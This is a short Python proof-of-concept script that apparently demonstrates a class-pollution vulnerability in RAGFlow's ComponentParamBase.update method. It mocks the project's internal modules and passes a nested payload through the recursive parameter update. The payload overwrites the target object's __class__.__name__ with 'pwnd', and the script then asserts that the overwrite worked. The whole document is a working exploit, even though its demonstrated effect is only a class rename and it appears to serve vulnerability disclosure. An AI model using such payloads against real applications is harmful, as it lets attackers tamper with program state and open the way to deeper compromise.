# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: ComponentParamBase.update -> _recursive_update_param
# Type: get-both-set-both

import sys
import types

# Mock ragflow's internal dependencies
for mod_name in ['agent', 'agent.settings', 'common', 'common.connection_utils', 'common.misc_utils']:
    m = types.ModuleType(mod_name)
    if mod_name == 'agent.settings':
        m.PARAM_MAXDEPTH = 5
    if mod_name == 'common.connection_utils':
        m.timeout = lambda *a, **kw: (lambda f: f)
    if mod_name == 'common.misc_utils':
        m.thread_pool_exec = None
    sys.modules[mod_name] = m
sys.modules['agent'].settings = sys.modules['agent.settings']

import pandas as pd
from agent.component.base import ComponentParamBase

class Target(ComponentParamBase):
  def check(self):
    pass

target = Target()

payload_value = "pwnd"
PAYLOAD = {"__class__": {"__name__": payload_value}}

def run_poc():
  target.update(PAYLOAD, allow_redundant=True)

def verify_poc():
  original = target.__class__.__name__
  assert original == "Target", f"Pre-condition failed: {original}"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
